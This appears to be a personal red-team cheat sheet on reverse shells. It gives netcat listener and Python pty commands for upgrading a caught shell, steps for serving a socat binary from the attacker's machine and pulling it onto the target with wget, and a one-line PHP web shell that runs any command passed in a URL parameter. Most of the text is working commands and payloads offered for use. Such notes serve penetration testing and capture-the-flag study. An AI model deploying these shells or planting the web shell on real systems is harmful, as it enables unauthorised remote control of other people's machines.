---
category:
  - redteam
---
!!! info "Info"
	"Reverse shells _allow attackers to open ports to the target machines, forcing communication and_ enabling a complete takeover of the target machine." -[Imperva](https://www.imperva.com/learn/application-security/reverse-shell/)
## Stabilization
### TTY Size
In second terminal window, get rows & columns with `stty -a`, then set them in the remote shell with `stty {rows|cols} <number>`

### Netcat
Rlwrap: `rlwrap nc -lvnp <port>`
If Python is available:
```bash
sudo nc -lvnp 1234  # listen for connections on port 1234
python -c 'import pty;pty.spawn("/bin/bash")'   # start bash
export TERM=xterm
[Ctrl+Z]    # background the session
stty raw -echo; fg     # Stabilze and foreground the shell
```
[Netcat for Windows](https://github.com/int0x33/nc.exe)
### Socat
If Python is available:
```
# Start Python webserver on local machine
sudo python3 -m http.server 80
# Get a netcat shell
sudo nc -lvnp <port> 
# Download socat compiled binary to target machine
wget \<local IP>/socat -O /tmp/socat
```

## Basic Webshell
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
See `/usr/share/webshells` on Kali
